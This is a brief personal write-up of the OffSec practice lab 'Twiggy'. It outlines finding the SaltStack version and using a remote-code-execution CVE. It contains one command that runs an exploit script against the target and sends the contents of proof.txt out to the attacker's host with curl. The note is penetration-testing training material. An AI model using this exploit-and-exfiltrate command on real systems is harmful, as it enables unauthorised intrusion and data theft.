---
title: Twiggy
date: 2026-09-02
tags:
  - lab
Walkthrough: https://portal.offsec.com/machine/twiggy-244/overview/details
---
# Twiggy
## Attack Path
Find the SaltStack version via headers. 
Use the RCE CVE for command execution.

## Notes
Nothing special and it's very straightforward. 
Since reverse shell command failed, I just did a little experiment for `cat proof.txt` with opening the python server
Then use `python3 48421.py -m $IP --exec "curl 192.168.45.155/\$(cat proof.txt)"`

## What Need to Develop
Patient 
Try to be conscious as early as possible during pentesting.
## What Learn New
